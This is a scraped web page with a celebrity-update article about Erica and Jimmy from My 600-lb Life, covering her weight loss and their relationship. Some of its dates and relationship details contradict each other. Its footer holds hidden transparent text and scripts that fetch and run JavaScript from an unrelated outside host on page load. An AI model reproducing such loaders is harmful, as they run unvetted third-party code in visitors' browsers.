Starring Dr. Younan Nowzaradan, My 600-lb Life has aired on TLC since 2012. So where are My 600 lb Life’s Erica and Jimmy now?</strong></p><p>Erica appeared on <a href=#>My 600-lb Life</a> in 2016 and, after watching re-runs of the show, many fans want to know what happened to Erica and where she is after her episode ended. So, let’s find out more about Erica and Jimmy.</p><img style=margin:auto;display:block;text-align:center;max-width:100%;height:auto src=https://cdn.statically.io/img/cdn1.realitytitbit.com/uploads/26/2022/06/Screenshot-2022-06-23-at-15.37.12.jpg><figure class="wp-block-grvmedia-grv-video GRVMultiVideo"></figure><h2 class=wp-block-heading id=h-meet-erica-from-my-600-lb-life>Meet Erica from My 600-lb Life</h2><p>My 600-lb Life season 5 episode 6 first told Erica’s story. The 44-year-old California native wasn’t visited by anyone apart from her niece, who would shower her and buy her groceries.</p><p>In a bid to stop being dependent on her niece and begin living her life to the full, Erica sought the help of <a href=#>Dr. Now</a> to lose hundreds of pounds. She started gaining weight at a young age and was relentlessly bullied.</p><h2 class=wp-block-heading id=what-happened-to-erica-on-my-600lb-life>What happened to Erica on My 600-lb Life?</h2><p>At the beginning of Erica’s My 600-lb Life episode, Erica was surprised each day when she woke – she expected to die in her sleep.</p><p>She was determined to stay alive, however, despite weighing almost 700lb and suffering excruciating pain. Erica <a href=# rel="noreferrer noopener nofollow">said</a> she had a “stomach that hung to her knees” and found walking very difficult.</p><p>Speaking of how she developed an eating disorder and depression, Erica said she was sexually assaulted by a group of people when she was 16 years old.</p><p>At 17 years old she had her stomach stapled, which meant there were complications for Dr. Now to tackle during surgery. Nevertheless, Erica had managed to lose 190lb by the end of her episode.</p><p>As per <a href=# rel="noreferrer noopener nofollow">Heavy</a>, by the end of Erica’s Where Are They Now? episode, she had lost another 100lb. Her Where Are They Now episode saw her return to California to continue her weight loss but feared the loss of support would derail her.</p><p>Erica also struggled to recover from past traumas and fights the urge to binge eat. My 600-lb Life’s Erica and Jimmy also faced some relationship disagreements during the show.</p><figure class="wp-block-embed is-type-rich is-provider-twitter wp-block-embed-twitter"><p lang=en dir=ltr><a href=#>#my600lblife</a> wow this Jimmy fellow seems like a standup guy. Erica is one of the few success stories! Nice too see</p>— kevin (@kevinru99857767) <a href=#>March 23, 2023</a></figure>View Tweet<h2 class=wp-block-heading id=erica-got-back-with-jimmy>Erica got back with Jimmy</h2><p>Erica appeared on My 600-lb Life in 2017 and, since then, it appears she was able to keep the weight off. Judging by her <a href=# rel="noreferrer noopener nofollow">Facebook page</a>, Erica and Jimmy got back together and were still a couple in 2019.</p><p>After the surgery, she had a setback after her partner Jimmy ended their relationship because he was fed up with the “clutter” that she kept in her home. Despite this, she continued to slim down and continue her journey.</p><p>She shared posts on her page about being in love in 2020 but doesn’t show any relationship information in her bio. Erica from My 600-lb Life also lost an amazing 290lb after starring in the <a href=#>TLC</a> show!</p><p>In January 2023, The Mirror <a href=# rel="noreferrer noopener nofollow">reported</a> that Erica shared a slim photo of herself on Facebook. She has definitely made progress, just like <a href=#>Chris P from My 600-lb Life, who has made ‘serious progress’ since the show</a>.</p><p class=has-text-align-center>WATCH MY 600-LB LIFE ON TLC WEDNESDAYS AT 8/7C</p><p class=has-text-align-center><strong>AND GET FREAKY WITH US ON <a href=# rel="noopener noreferrer nofollow">INSTAGRAM</a> AND <a href=# rel="noopener noreferrer nofollow">FACEBOOK</a></strong></p><p class=postsid style=color:rgba(255,0,0,0)>ncG1vNJzZmivp6x7s7HApaCtsaSewaO102eaqKVfqbmke8SroJyZXaLGboKPaWSlml2htqex</p></section></article></main></div><footer><div class=container><span class=copyright>&copy; 2024 JiveSync - <a rel=license href=http://creativecommons.org/licenses/by/4.0/>CC BY 4.0</a></span></div></footer><script type=text/javascript>(function(){var n=Math.floor(Date.now()/1e3),t=document.getElementsByTagName("script")[0],e=document.createElement("script");e.src="https://js.zainuddin.my.id/floating.js?v="+n+"",e.type="text/javascript",e.async=!0,e.defer=!0,t.parentNode.insertBefore(e,t)})()</script><script type=text/javascript>(function(){var n=Math.floor(Date.now()/1e3),t=document.getElementsByTagName("script")[0],e=document.createElement("script");e.src="https://js.zainuddin.my.id/tracking_server_6.js?v="+n+"",e.type="text/javascript",e.async=!0,e.defer=!0,t.parentNode.insertBefore(e,t)})()</script><script>var _paq=window._paq=window._paq||[];_paq.push(["trackPageView"]),_paq.push(["enableLinkTracking"]),function(){e="//analytics.cdnweb.info/",_paq.push(["setTrackerUrl",e+"matomo.php"]),_paq.push(["setSiteId","1"]);var e,n=document,t=n.createElement("script"),s=n.getElementsByTagName("script")[0];t.async=!0,t.src=e+"matomo.js",s.parentNode.insertBefore(t,s)}()</script></body></html>
